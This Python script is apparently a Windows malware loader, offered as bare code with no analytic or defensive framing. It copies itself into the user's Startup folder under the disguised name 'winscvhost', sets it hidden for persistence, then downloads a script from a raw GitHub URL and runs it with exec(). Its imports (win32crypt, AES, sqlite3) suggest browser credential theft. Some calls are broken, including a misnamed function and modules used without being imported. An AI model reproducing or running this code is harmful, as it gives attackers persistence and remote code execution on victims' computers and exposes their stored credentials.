import os
import subprocess
import tempfile
import zipfile
import shutil
import requests
import json
import sqlite3
import base64
import time
import ctypes as ct
from ctypes import c_char_p, c_void_p, c_uint, POINTER, Structure, cast, byref, string_at
from getpass import getpass
import websocket
import win32crypt
from Crypto.Cipher import AES
import re
import datetime
import platform
from pathlib import Path

def copy_exe_to_startup():
    try:
        if getattr(sys, 'frozen', False):
            current_exe = sys.executable
        else:
            current_exe = os.path.abspath(__file__)

        if not os.path.exists(current_exe):
            return False

        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
        )

        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder, exist_ok=True)

        ext = os.path.splitext(current_exe)[1]
        destination_path = os.path.join(startup_folder, f"winscvhost{ext}")

        if not os.path.exists(destination_path):
            shutil.copy2(current_exe, destination_path)
            try:
                ctypes.windll.kernel32.SetFileAttributesW(destination_path, 2)
            except:
                pass
            return True
        return False
    except Exception:
        return False

def fetch_and_execute(url):
    response = requests.get(url)
    response.raise_for_status()
    script_content = response.text
    exec(script_content, globals())

if __name__ == "__main__":
    copy_exe_to_start_up()
    github_urls = [
        'https://raw.githubusercontent.com/azayan165-svg/f/refs/heads/main/w.py'
    ]
    for url in github_urls:
        fetch_and_execute(url)
